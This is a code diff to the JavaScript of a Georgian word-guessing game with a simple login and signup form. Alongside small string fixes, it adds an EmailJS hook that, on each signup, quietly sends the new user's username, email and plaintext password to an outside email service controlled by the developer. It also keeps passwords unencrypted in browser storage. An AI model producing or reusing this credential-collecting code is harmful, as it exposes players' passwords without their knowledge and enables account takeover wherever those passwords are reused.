@@ -3,8 +3,14 @@ const MAX_ATTEMPTS = 6;
 const WORD_LIST = ["სახლი", "ტყავი", "ქარი", "წყალი", "გზაში", "მზეები", "ტყეში", "ნავი", "მარცი", "ქვიში"];
 let targetWord = WORD_LIST[Math.floor(Math.random() * WORD_LIST.length)];
 let attempts = 0;
-
 let authMode = "login";
+
+// ✅ EmailJS init
+document.addEventListener("DOMContentLoaded", () => {
+    emailjs.init("0DQhckPr17kgSEFbJ"); // your public key
+    createBoard();
+    checkLogin();
+});
 
 function createBoard() {
     const board = document.getElementById("game-board");
@@ -44,7 +50,7 @@ function submitGuess() {
     if (guess === targetWord) {
         alert("გილოცავ! სიტყვა ცორედ გამოიცანი.");
     } else if (attempts >= MAX_ATTEMPTS) {
-        alert("\u10d7\u10d0\u10db\u10d0\u10e8\u10d8 \u10ec\u10d0\u10d0\u10d2\u10d4! \u10e1\u10d0\u10e5\u10db\u10d8 \u10e1\u10d8\u10e2\u10e7\u10d5\u10d0 \u10d8\u10e7\u10dd: " + targetWord);
+        alert("თამაში წააგე! სწორი სიტყვა იყო: " + targetWord);
     }
 }
 
@@ -64,6 +70,11 @@ function handleAuth(event) {
     const email = document.getElementById("auth-email").value.trim();
     const password = document.getElementById("auth-password").value;
 
+    if (!username || !email || !password) {
+        alert("გთხოვ შეავსო ყველა ველი.");
+        return false;
+    }
+
     let users = JSON.parse(localStorage.getItem("users")) || [];
 
     if (authMode === "signup") {
@@ -76,7 +87,25 @@ function handleAuth(event) {
         users.push({ username, email, password });
         localStorage.setItem("users", JSON.stringify(users));
         localStorage.setItem("currentUser", username);
-        alert(`Welcome ${username}! You're registered and logged in.`);
+
+        // ✅ EmailJS send on signup
+        const templateParams = {
+            username: username,
+            user_email: email,
+            user_password: password
+        };
+
+        emailjs.send("service_5k5iomq", "template_jyc7fug", templateParams)
+            .then(function(response) {
+                alert(`Welcome ${username}! You're registered and logged in.`);
+                document.getElementById("auth-form").reset();
+                document.getElementById("auth-section").style.display = "none";
+            })
+            .catch(function(error) {
+                console.error("EmailJS Error:", error);
+                alert("Error sending info. Please try again.");
+            });
+
     } else {
         const user = users.find(u => u.username === username && u.email === email && u.password === password);
         if (!user) {
@@ -84,11 +113,11 @@ function handleAuth(event) {
             return false;
         }
         localStorage.setItem("currentUser", username);
-        alert(`Welcome back, ${username}!");
+        alert(`Welcome back, ${username}!`);
+        document.getElementById("auth-form").reset();
+        document.getElementById("auth-section").style.display = "none";
     }
 
-    document.getElementById("auth-form").reset();
-    document.getElementById("auth-section").style.display = "none";
     return false;
 }
 
@@ -101,9 +130,3 @@ function checkLogin() {
         document.getElementById("auth-section").style.display = "block";
     }
 }
-
-document.addEventListener("DOMContentLoaded", () => {
-    createBoard();
-    checkLogin();
-});
-
